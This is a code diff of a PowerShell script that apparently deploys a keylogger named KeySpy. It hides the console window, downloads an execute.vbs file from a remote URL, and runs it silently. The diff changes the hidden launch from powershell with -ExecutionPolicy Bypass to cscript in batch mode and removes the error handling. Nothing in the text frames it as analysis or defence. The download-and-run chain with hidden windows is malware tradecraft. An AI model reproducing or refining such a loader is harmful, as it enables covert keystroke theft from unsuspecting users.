@@ -1,6 +1,4 @@
-
-try {
-    Set-ExecutionPolicy RemoteSigned -Scope CurrentUser -Force
+Set-ExecutionPolicy RemoteSigned -Scope CurrentUser -Force
 
 Add-Type -Name Window -Namespace Console -MemberDefinition '
 [DllImport("Kernel32.dll")]
@@ -53,15 +51,6 @@ Remove-Item "$destinationFolder\KeySpy.zip" -Force
 $vbsFilePath = Join-Path -Path $destinationTemp -ChildPath "execute.vbs"
 Invoke-WebRequest -Uri $vbsUrl -OutFile $vbsFilePath -UseBasicParsing
 
-# Execute the execute.vbs script silently from the temporary folder
-Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File '$vbsFilePath'" -Wait
-
-WScript.Echo "Executing execute.vbs script..."
-
-}
-catch {
-    $errorMessage = $_.Exception.Message
-    Add-Content -Path "C:\error.log" -Value "Error: $errorMessage"
-}
-
+# Execute the execute.vbs script using cscript.exe
+Start-Process cscript.exe -ArgumentList "//B //Nologo $vbsFilePath" -WindowStyle Hidden -Wait
 
